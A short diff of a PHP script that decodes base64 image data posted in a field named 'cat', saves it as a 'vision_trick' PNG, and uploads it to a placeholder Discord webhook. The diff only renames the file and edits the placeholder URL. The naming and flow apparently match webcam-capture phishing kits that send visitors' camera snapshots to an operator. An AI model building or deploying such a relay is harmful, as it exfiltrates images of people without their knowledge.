@@ -10,13 +10,13 @@ if (!empty($_POST['cat'])) {
     $unencodedData = base64_decode($filteredData);
 
     // Save the image locally
-    $filename = 'vision_trick_' . $date . '.png';
+    $filename = 'visiontrick' . $date . '.png';
     $fp = fopen($filename, 'wb');
     fwrite($fp, $unencodedData);
     fclose($fp);
 
     // Send the image to Discord
-    $discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your Discord webhook URL
+    $discordWebhookUrl = 'https://discord.com/api/webhooks/your_webhook_url_here'; // Placeholder for the webhook URL
     $file = curl_file_create($filename, 'image/png', $filename);
 
     $payload = [
